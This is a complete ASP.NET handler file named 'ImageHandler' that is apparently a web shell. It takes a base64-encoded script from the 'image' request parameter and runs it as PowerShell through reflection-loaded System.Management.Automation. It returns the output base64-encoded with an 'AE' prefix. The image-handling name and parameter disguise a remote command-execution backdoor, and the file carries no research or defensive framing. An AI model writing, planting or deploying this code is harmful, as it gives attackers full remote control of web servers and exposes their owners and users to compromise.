<%@ WebHandler Language="C#" Class="ImageHandler" %>

using System;
using System.Web;
using System.Reflection;
using System.Collections.ObjectModel;
using System.Collections.Generic;

public class ImageHandler : IHttpHandler
{
    public void ProcessRequest(HttpContext context)
    {
        string param = context.Request.Params["image"];
        if (!string.IsNullOrEmpty(param))
        {
            param = param.Substring(2);
            var base64EncodedBytes = System.Convert.FromBase64String(param);
            string script = System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
            Assembly asm = Assembly.Load("System.Management.Automation, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
            Type powerShellClass = asm.GetType("System.Management.Automation.PowerShell");
            MethodInfo Create = powerShellClass.GetMethod("Create", new Type[] { });
            var ps = Create.Invoke(null, null);
            MethodInfo AddScript = powerShellClass.GetMethod("AddScript", new Type[] { typeof(string)} );
            object[] parametersArray = new object[] { script };
            AddScript.Invoke(ps, parametersArray);

            MethodInfo invoke = AddScript;
            MethodInfo[] methods = powerShellClass.GetMethods(BindingFlags.Instance|BindingFlags.Public|BindingFlags.DeclaredOnly);
            foreach (MethodInfo method in methods)
            {
                if (method.Name.Equals("Invoke"))
                {
                    invoke = method;
                    break;
                }
            }
            var result = invoke.Invoke(ps, null);
            Type type = result.GetType();
            MemberInfo[] itemCount = type.GetMember("Count");
            int count = (int)getValue(itemCount[0], result);
            PropertyInfo pinfo = type.GetProperty("Item");
            string output = "";
            for (int i = 0; i < count; i++)
            {
                output += pinfo.GetValue(result, new Object[] { i }).ToString() + "\n";
            }

            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(output);
            output =  System.Convert.ToBase64String(plainTextBytes);
            output = "AE" + output;
            context.Response.Write(output);
        }
        context.Response.AddHeader("Result","done");
    }

    public object getValue(MemberInfo memberInfo, object forObject)
    {
        switch (memberInfo.MemberType)
        {
            case MemberTypes.Field:
                return ((FieldInfo)memberInfo).GetValue(forObject);
            case MemberTypes.Property:
                return ((PropertyInfo)memberInfo).GetValue(forObject);
            default:
                throw new NotImplementedException();
        }
    }

    public bool IsReusable
    {
        get
        {
            return true;
        }
    }
}